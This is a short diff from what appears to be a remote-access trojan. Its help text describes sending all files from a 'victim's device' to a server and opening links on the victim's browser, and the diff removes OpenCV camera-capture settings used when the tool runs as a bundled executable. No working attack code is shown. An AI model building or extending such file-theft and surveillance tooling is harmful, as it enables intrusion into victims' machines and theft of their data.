@@ -46,9 +46,6 @@ banner = r"""
  -open-browser link: Open browser to specifc link.
  -send-all: send all files for current directory from victim's device to the server.
 """
-if hasattr(sys, '_MEIPASS'):
-    os.environ['OPENCV_VIDEOIO_PRIORITY_MSMF'] = '0'
-    os.environ['OPENCV_FFMPEG_CAPTURE_OPTIONS'] = 'videoio;msmf'
 def open_browser(link:str):
     if link.startswith('http://') or link.startswith('https://'):
         webbrowser.open(link)
